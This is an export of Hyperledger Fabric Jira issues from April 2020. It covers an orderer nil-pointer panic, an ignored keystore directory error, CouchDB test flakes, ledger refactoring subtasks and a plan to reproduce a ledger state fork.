[e][OrdererOrg.orderer2] 2020-04-13 14:33:47.417 PDT [orderer.common.cluster] applyMembershipConfig -> INFO 10a 3 exists in both old and new membership for channel testchannel , skipping its deactivation[e][OrdererOrg.orderer2] 2020-04-13 14:33:47.417 PDT [orderer.common.cluster] applyMembershipConfig -> INFO 10a 3 exists in both old and new membership for channel testchannel , skipping its deactivation[e][OrdererOrg.orderer2] 2020-04-13 14:33:47.417 PDT [orderer.common.cluster] applyMembershipConfig -> INFO 10b 5 exists in both old and new membership for channel testchannel , skipping its deactivation[e][OrdererOrg.orderer2] 2020-04-13 14:33:47.417 PDT [orderer.common.cluster] Configure -> INFO 10c Exiting[e][OrdererOrg.orderer2] panic: runtime error: invalid memory address or nil pointer dereference[e][OrdererOrg.orderer2] [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x482498f][e][OrdererOrg.orderer2][e][OrdererOrg.orderer2] goroutine 631 [running]:[e][OrdererOrg.orderer2] github.com/hyperledger/fabric/orderer/consensus/etcdraft.(*Chain).apply(0xc0000ee780, 0xc00014fdf8, 0x1, 0x7)[e][OrdererOrg.orderer2] /Users/baohua/Workspace/Go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain.go:1109 +0xc2f[e][OrdererOrg.orderer2] github.com/hyperledger/fabric/orderer/consensus/etcdraft.(*Chain).serveRequest(0xc0000ee780)[e][OrdererOrg.orderer2] /Users/baohua/Workspace/Go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain.go:756 +0x975[e][OrdererOrg.orderer2] created by github.com/hyperledger/fabric/orderer/consensus/etcdraft.(*Chain).Start[e][OrdererOrg.orderer2] /Users/baohua/Workspace/Go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain.go:340 +0x230

```

The full log can be found in the attachment ginkgo-result2.log.",,baohua,denyeart,dereckluo,mplisov,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Apr/20 7:02 AM;baohua;etcdraft_reconfig_test.go;https://jira.hyperledger.org/secure/attachment/18218/etcdraft_reconfig_test.go","14/Apr/20 7:06 AM;baohua;ginkgo-result2.log;https://jira.hyperledger.org/secure/attachment/18217/ginkgo-result2.log",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zs01",,,,Unset,Unset,,see etcdraft_reconfig_test.go in the attachment,,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,denyeart,dereckluo,mplisov,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Apr/20 11:18 AM;denyeart;[~baohua]

The line causing the nil pointer is:

[https://github.com/hyperledger/fabric/blob/release-1.4/orderer/consensus/etcdraft/chain.go#L1109]

Could you maybe put each of those variables on their own line, and then run again to see which is the variable that causes the nil pointer?

It should then be easier to track down the problem.;;;","30/Apr/20 5:46 AM;yacovm;probably *b* is an empty block (no header);;;","06/May/20 2:14 AM;dereckluo;https://github.com/hyperledger/fabric/pull/1214;;;","25/Jun/20 7:55 PM;denyeart;[~dereckluo] Looks like both your PRs got closed, could you summarize your findings so far?;;;","26/Jun/20 5:34 AM;dereckluo;The 2PRs only address nil pointer exception error, but did not solve the actual cause for the problem, therefore they got closed, and future investigation is required.

For my findings, currently this bug occurs inconsistently (flaky) when orderers are being repeatedly added and removed from channel. In addition, the test will pretty much pass every time for only a single action on add and remove. It is when multiple add/remove actions being called in a roll, and it will fail. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Return KeyStore error when making directory failed,FAB-17752,44809,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,shitaibin,shitaibin,shitaibin,14/Apr/20 11:38 AM,19/Apr/20 12:10 PM,28/Oct/23 3:09 AM,19/Apr/20 12:10 PM,v1.4.6,,,,,,,,,v1.4.7,,,,fabric-crypto,,,,,,,,,0,,,,,,"Errors should not be ignored when making directory failed.

 
{code:java}
func (ks *fileBasedKeyStore) createKeyStore() error {
   // Create keystore directory root if it doesn't exist yet
   ksPath := ks.path
   logger.Debugf(""Creating KeyStore at [%s]..."", ksPath)

   os.MkdirAll(ksPath, 0755) // error has been ignored

   logger.Debugf(""KeyStore created at [%s]."", ksPath)
   return nil
}
{code}
 ",,denyeart,shitaibin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01az7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,shitaibin,,,,,,,,,,,,,release-1.4,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Apr/20 8:58 PM;denyeart;https://github.com/hyperledger/fabric/pull/1083;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions to update orderer and consortium MSP configuration,FAB-17753,44810,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,wlahti,wlahti,15/Apr/20 12:54 AM,24/Apr/20 12:29 AM,28/Oct/23 3:09 AM,24/Apr/20 12:29 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,FAB-17642 implemented updating an application MSP (later refactored as UpdateApplicationMSP() via FAB-17659). We should similarly have functions for updating  orderer and consortium MSP configuration.,,wlahti,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzxf",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,xwu,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Apr/20 8:32 PM;xwu;https://github.com/hyperledger/fabric/pull/1114;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
remove extra range query and execute query API for the pagination,FAB-17754,44812,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,15/Apr/20 11:05 AM,15/Apr/20 11:05 AM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"Instead of having two range and execute query APIs, we can have one API and receive an option struct instead. However, we need to decide where to keep the ledger types that are used across fabric packages. Once we decide that, we can remove one of the APIs. ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01azn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
couchDB UT flakes: increase waitFor couchdb index creation,FAB-17755,44813,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Apr/20 3:04 PM,19/Apr/20 12:20 AM,28/Oct/23 3:09 AM,19/Apr/20 12:20 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"The CouchDB creates an index in the background and responds to the REST API immediately.
Currently, we wait only for 2 seconds before failing the test. Within the 2 seconds, every 100 msecs, CouchDB is queried to ensure that the passed index is being built and can be used for the query. On a first success, the test is passed. 

As we have only 2 vCPUs, 4 GB of RAM to run CI, it may not be sufficient enough for CouchDB to build index within the 2 seconds. Further, if we run tests in parallel, the CouchDB could face CPU contention too. Note that the CouchDB consumes 3x higher CPU utilization as compared to the goleveldb.

Hence, we increase the wait time to 6 seconds and the query time to 1 second. ",,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01azv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 12:20 AM;denyeart;https://github.com/hyperledger/fabric/pull/1092;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
remove txmgr interface,FAB-17756,44814,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Apr/20 7:08 PM,24/Nov/20 8:21 AM,28/Oct/23 3:09 AM,24/Nov/20 6:53 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We have a TxMgr interface as the initial plan was to implement two types of transaction manager:
# lock based txmgr
# snapshot isolation based txmgr
In the last three years and in the many coming years, we may not implement another txmgr. Hence, we can remove the interface and unnecessary mocks. ",,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b03:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Nov/20 6:53 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1335;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv lockbasedtxmgr to txmgr,FAB-17757,44815,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Apr/20 7:12 PM,24/Nov/20 8:22 AM,28/Oct/23 3:09 AM,24/Nov/20 8:21 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"As we decided to keep a single txmgr implementation, we can avoid additional folder depth and reduce a package by moving lockbasedtxmgr to txmgr. 

TxStatInfo defined in txmgr is imported and used in both lockbasedtxmgr and validator. If we move the lockbasedtxmgr to txmgr, we will get an import cycle. As TxStatInfo is used by kvledger, metrics, lockbasedtxmgr, and validator, we need to find a suitable place to keep these structs. Only if we can do that, we can move lockbasedtxmgr to txmgr. ",,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b0b:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,Senthil1,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Nov/20 8:22 AM;manish-sethi;Done as part of (FAB-17756) in PR - https://github.com/hyperledger/fabric/pull/1335;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv post-order tx execution out of validator,FAB-17758,44816,44551,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,Senthil1,Senthil1,15/Apr/20 7:15 PM,15/Apr/20 7:35 PM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We pass lockbasedtxmgr to the validator so that the validator can get a tx simulator to execute the post-order transaction. As this is a side-effect, we need to run the post-order execution within the lockbasedtxmgr and only use validator to perform the serializability check. 

When we do that, we can remove the TxSimulatorProvider interface from the valimpl. ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b0j:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm unnecessary mock from txmgr,FAB-17759,44817,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Apr/20 7:46 PM,28/Apr/20 12:22 PM,28/Oct/23 3:09 AM,28/Apr/20 12:22 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"In the validator, we already create a mock for TxMgr interface but use the mock created at txmgr package. Hence, we need to make the validator to use the mock that present locally.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b0r:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
merge queryHelper with the queryExecutor,FAB-17760,44820,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Apr/20 10:58 PM,27/Apr/20 7:11 PM,28/Oct/23 3:09 AM,27/Apr/20 7:11 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"In lockbasedtxmgr, we have a lockBasedQueryExecutor and a lockBasedTxSimulator struct. The lockBasedTxSimulator implements mainly SetXXX() APIs while lockBasedQueryExecutor implements GetXXX() APIs. As the transaction simulation also involves query, the lockBasedTxSimulator encapsulate lockBasedQueryExecutor. Only in the lockBasedTxSimulator, we collect readSet while using GetXXX() and writeSet while using SetXXX(). However, when we use lockBasedQueryExecutor alone, we don't collect readSet.

Currently, we have an unnecessary indirection with QueryHelper and it makes code readability a bit hard. Hence, we need to merge the QueryHelper with the lockBasedQueryExecutor itself. ",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b1f:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
create a copy of ledger config struct in couchdb test,FAB-17761,44821,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,16/Apr/20 12:01 AM,28/Apr/20 12:22 PM,28/Oct/23 3:09 AM,28/Apr/20 12:22 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"We make changes to retries, address to test some failure scenarios. To ensure proper cleanup, we revert those changes. It looks hacky and hence, we want to copy the config and use it for testing failure scenarios.",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b1n:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix non-determinism in the couchdb index processing ,FAB-17762,44822,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,Senthil1,dereckluo,dereckluo,16/Apr/20 12:43 AM,28/Apr/20 12:23 PM,28/Oct/23 3:09 AM,28/Apr/20 12:23 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"Unit test flake in TestHandleChaincodeDeployErroneousIndexFile, log attached. 
Might be related to JIRA https://jira.hyperledger.org/browse/FAB-17737


{code:java}
2020-04-15T15:25:41.8567157Z [36m2020-04-15 15:25:38.539 UTC [statecouchdb] applyAdditionalQueryOptions -> DEBU 236[0m Rewritten query: {""limit"":1000,""selector"":{""owner"":""fred""},""sort"":[{""size"":""desc""}]}
2020-04-15T15:25:41.8568585Z [36m2020-04-15 15:25:38.540 UTC [statecouchdb] applyAdditionalQueryOptions -> DEBU 237[0m Rewritten query: {""limit"":1000,""selector"":{""owner"":""fred""},""sort"":[{""size"":""desc""}]}
2020-04-15T15:25:41.8570452Z [36m2020-04-15 15:25:38.542 UTC [statecouchdb] executeQueryWithBookmark -> DEBU 238[0m Error calling QueryDocuments(): error handling CouchDB request. Error:no_usable_index,  Status Code:400,  Reason:No index exists for this sort, try indexing by the sort fields.
2020-04-15T15:25:41.8571369Z --- FAIL: TestHandleChaincodeDeployErroneousIndexFile (2.13s)
2020-04-15T15:25:41.8571713Z     statecouchdb_test_export.go:34: Initializing TestVDBEnv
2020-04-15T15:25:41.8572146Z     statecouchdb_test.go:665: 
2020-04-15T15:25:41.8572417Z         	Error Trace:	statecouchdb_test.go:665
2020-04-15T15:25:41.8572921Z         	Error:      	Condition never satisfied
2020-04-15T15:25:41.8573231Z         	Test:       	TestHandleChaincodeDeployErroneousIndexFile
2020-04-15T15:25:41.8573802Z         	Messages:   	error executing query with sort
2020-04-15T15:25:41.8574240Z     statecouchdb_test_export.go:89: Cleaningup TestVDBEnv
2020-04-15T15:25:41.8575112Z [36m2020-04-15 15:25:38.658 UTC [statecouchdb] NewVersionedDBProvider -> DEBU 239[0m constructing CouchDB VersionedDBProvider
2020-04-15T15:25:41.8576240Z [36m2020-04-15 15:25:38.686 UTC [statecouchdb] checkExpectedDataformatVersion -> DEBU 23a[0m couch instance is empty. Setting dataformat version to 2.0
2020-04-15T15:25:41.8577355Z [34m2020-04-15 15:25:38.735 UTC [couchdb] CreateDatabaseIfNotExist -> INFO 23b[0m Created state database testpaginatedquery_
2020-04-15T15:25:41.8579463Z [36m2020-04-15 15:25:38.736 UTC [statecouchdb] newVersionedDB -> DEBU 23c[0m chain [testpaginatedquery]: checking for redolog record
{code}
",,denyeart,dereckluo,Senthil1,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Apr/20 12:42 AM;dereckluo;62.txt;https://jira.hyperledger.org/secure/attachment/18219/62.txt","17/Apr/20 11:29 PM;sykesm;80.txt;https://jira.hyperledger.org/secure/attachment/18221/80.txt",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01b1v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dereckluo,Senthil1,sykesm,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Apr/20 11:28 PM;sykesm;Hit this twice in a row this morning and twice yesterday.;;;","18/Apr/20 12:59 AM;Senthil1;Introduced by https://github.com/hyperledger/fabric/pull/966 We will change the production code to ensure deterministic behavior. When a bunch of index files is passed to statecouchdb package, we should make it process all valid index and log error for the invalid index. Currently, we do log the error but at one level higher. We can log the error in statecouchdb package itself. If we don't fix this non-determinism, we will have some peers with all index and some peers with missing index.  

Thanks to [~sykesm] for pointing out this non-determinism. ;;;","18/Apr/20 11:39 PM;denyeart;[https://github.com/hyperledger/fabric/pull/1121] - Senthil's

[https://github.com/hyperledger/fabric/pull/1119] - Matt's;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE join all peers in the org,FAB-17763,44824,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,16/Apr/20 7:08 AM,17/Apr/20 5:58 AM,28/Oct/23 3:09 AM,17/Apr/20 5:58 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"PTE needs to join all peers in the org to a channel.

This will also apply to chaincode installation, upgrade, and instantiation",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwzc",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ReCreate State Fork Environment,FAB-17764,44825,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,dongming,btl5037,btl5037,16/Apr/20 12:05 PM,11/Jan/21 2:38 AM,28/Oct/23 3:09 AM,11/Jan/21 2:38 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,quality,,,,,"We had a development team notify us they were able to introduce a state fork into their ledger. We will need to recreate their scenario as a means of debugging the fork and will maintain the assets as a test scenario.

The scenario is as follows:
 * Client driver should be able to work against any Fabric version v1.1 through v2.x - we'll want to test against Fabric v1.1 initially for best chance of reproduction, with ability to also run against current releases to compare results.

 * Test will initially use legacy chaincode lifecycle, although it could be extended later to use new chaincode lifecycle if we see merit in running the test going forward.

 * Don't use Composer, since those tests would not be applicable in future versions, but drive similar workload as Composer from peer perspective (e.g chaincodes with CouchDB indexes, JSON queries, and Init() reads/writes)

 * Chaincode Init() should read/write a key that represents JSON with two fields, field1 and field2
 Utilize 10 channels.

 * Each chaincode upgrade will alter index definition to ensure index is continuously rebuilt, e.g. alternate index definition to include (field1) only and (field1,field2), in every other chaincode definition.

 * Run two peer processes on hardware with reduced CPU and io resources, to increase likelihood of reproduction

 * Run chaincode upgrades against all 10 channels in a continuous loop.

 * If there is a fork in any channel, the chaincode upgrade commit will fail with MVCC conflict on one of the two peers. It will then be known that the prior chaincode upgrade commit was the faulty transaction, and debug logs can be evaluated for that transaction.

 * A second client workload should also be applied, to perform continuous JSON queries. For example the JSON query can filter on both field1 and field2. Note, in this case all queries should result in an index hit, regardless of whether the index is currently based on one field or both fields.

Acceptance Criteria: We observe the fork. If unable to recreate the assets will still be used for future testing.",,btl5037,dongming,robmurgai,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,No,Unset,,,,,No,,Unset,No,,,"1|i011r4:",,,,No,Unset,,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),btl5037,dongming,robmurgai,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/May/20 2:04 AM;robmurgai;Is the Acceptance Criteria to have all 9 bullet points doable?;;;","01/May/20 2:24 AM;btl5037;All 9 points are required to recreate the fork, so I've added acceptance criteria for the issue. ;;;","12/Jun/20 2:06 AM;btl5037;Pending the update to the operator to support multi-channel operations

 ;;;","12/Jun/20 11:26 PM;dongming;pending the update to the operator to support json query too;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Custom Chaincode,FAB-17765,44826,44825,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,btl5037,btl5037,16/Apr/20 12:30 PM,21/May/20 12:19 AM,28/Oct/23 3:09 AM,21/May/20 12:19 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The state fork recreation requires chaincode that performs a certain action in its init function:
 * Ensure you are using the v1.1 shim and protos (if required).
 * The init function should read/write a key that represents JSON with two fields, field1 and field2.
 * The invoke function should simply create a new asset.
